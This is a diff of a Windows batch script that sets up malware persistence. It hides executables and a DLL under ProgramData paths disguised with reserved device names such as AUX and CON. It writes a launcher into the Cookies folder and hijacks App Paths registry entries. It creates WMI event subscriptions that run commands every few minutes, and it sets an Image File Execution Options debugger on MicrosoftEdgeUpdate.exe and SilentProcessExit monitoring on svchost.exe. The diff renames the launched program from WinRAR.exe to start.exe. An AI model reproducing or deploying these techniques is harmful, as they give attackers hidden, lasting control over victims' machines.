@@ -22,8 +22,8 @@ echo powershell.exe \\.\%ProgramData%\AUX..\Input.exe \\.\%ProgramData%\AUX..\Ic
 echo @echo off > "%USERPROFILE%\Cookies\init.cmd"
 echo powershell.exe \\.\%ProgramData%\CON..\Input.exe \\.\%ProgramData%\CON..\Kape.dll >> "%USERPROFILE%\Cookies\init.cmd"
 
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\start.exe" /t REG_SZ /d "%USERPROFILE%\Cookies\init.cmd" /f
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\install.exe" /t REG_SZ /d "%USERPROFILE%\Cookies\ini.cmd" /f
-reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\WinRAR.exe" /t REG_SZ /d "%USERPROFILE%\Cookies\init.cmd" /f
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\setup.exe" /t REG_SZ /d "%WINDIR%\System32\oobe\Setup.exe" /f
 
 wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="SCM", EventNameSpace="root\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 180 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
@@ -35,10 +35,10 @@ wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name=
 wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"Event\"", Consumer="CommandLineEventConsumer.Name=\"Event\""
 
 wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="Consumer", EventNameSpace="root\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 240 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
-wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="Consumer", CommandLineTemplate="%WINDIR%\System32\cmd.exe /c start WinRAR.exe"
+wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="Consumer", CommandLineTemplate="%WINDIR%\System32\cmd.exe /c start start.exe"
 wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"Consumer\"", Consumer="CommandLineEventConsumer.Name=\"Consumer\""
 
-reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\MicrosoftEdgeUpdate.exe" /v Debugger /t REG_SZ /d "%WINDIR%\System32\cmd.exe /c start WinRAR.exe" /f
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\MicrosoftEdgeUpdate.exe" /v Debugger /t REG_SZ /d "%WINDIR%\System32\cmd.exe /c start start.exe" /f
 
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\svchost.exe" /v GlobalFlag /t REG_DWORD /d 512 /f
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\svchost.exe" /v ReportingMode /t REG_DWORD /d 1 /f /reg:64
